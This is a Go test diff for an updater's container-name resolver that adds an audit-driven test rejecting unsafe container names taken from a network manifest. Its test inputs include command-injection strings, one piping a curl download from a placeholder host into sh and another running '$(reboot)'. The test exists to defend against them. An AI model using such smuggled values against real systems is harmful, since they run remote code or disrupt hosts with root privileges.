@@ -2,6 +2,7 @@ package container
 
 import (
 	"context"
+	"strings"
 	"testing"
 
 	"github.com/payram/payram-updater/internal/manifest"
@@ -164,5 +165,27 @@ func TestResolver_ValidateExists_ContainerNotFound(t *testing.T) {
 
 	if resErr.GetFailureCode() != "CONTAINER_NOT_FOUND" {
 		t.Errorf("expected failure code 'CONTAINER_NOT_FOUND', got '%s'", resErr.GetFailureCode())
+	}
+}
+
+// TestResolver_Resolve_IgnoresAManifestNameDockerWouldRefuse (audit L6): the
+// manifest comes from the network and the name ends up in commands the
+// merchant runs as root, so only a valid Docker name is used; anything else
+// leaves the container to be found by its image.
+func TestResolver_Resolve_IgnoresAManifestNameDockerWouldRefuse(t *testing.T) {
+	for _, name := range []string{"payram; curl -s https://x/y | sh #", "$(reboot)", "-payram", "pay ram", "p"} {
+		resolver := NewResolver("", "docker", nil)
+		_, err := resolver.Resolve(&manifest.Manifest{Defaults: manifest.Defaults{ContainerName: name}})
+		resErr, ok := err.(*ResolutionError)
+		if !ok || resErr.GetFailureCode() != "CONTAINER_NAME_UNRESOLVED" {
+			t.Errorf("%q: got %v, want CONTAINER_NAME_UNRESOLVED (found by image instead)", name, err)
+		}
+		if err != nil && strings.Contains(err.Error(), name) {
+			t.Errorf("%q: the error repeats the name: %v", name, err)
+		}
+	}
+	resolved, err := NewResolver("", "docker", nil).Resolve(&manifest.Manifest{Defaults: manifest.Defaults{ContainerName: "payram_prod-1.eu"}})
+	if err != nil || resolved.Name != "payram_prod-1.eu" {
+		t.Fatalf("a valid name: %v %v", resolved, err)
 	}
 }
